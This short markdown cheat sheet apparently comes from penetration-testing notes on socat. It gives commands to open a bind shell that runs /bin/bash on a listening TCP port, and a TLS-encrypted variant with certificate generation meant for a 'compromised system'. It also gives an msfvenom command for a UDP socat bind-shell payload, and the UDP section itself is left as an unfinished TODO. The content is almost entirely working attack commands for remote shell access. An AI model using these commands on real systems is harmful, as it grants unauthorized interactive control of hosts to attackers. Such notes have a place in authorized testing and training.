# Socat

## 01 - TCP Method

```
$ socat tcp-listen:<PORT>,reuseaddr,fork exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane
```
\
### 1.1 - Encrypted Bind Shell

Note: Only generated TLS certificates in a compromised system.

```
$ openssl req -newkey rsa:2048 -nodes -keyout private.key -x509 -days 362 -out certificate.crt

$ cat private.key certificate.crt > key.pem

$ socat OPENSSL-LISTEN:<PORT>,cert=key.pem,verify=0,fork EXEC:/bin/bash
```

## 02 - UDP Method

TODO: Generate an msfvenom for UDP bind shell socat

```
$ socat
```

## 03 - Generate via `msfvenom`

### 3.1 - UDP Method

```
$ msfvenom -p cmd/unix/bind_socat_udp lport=<PORT>
```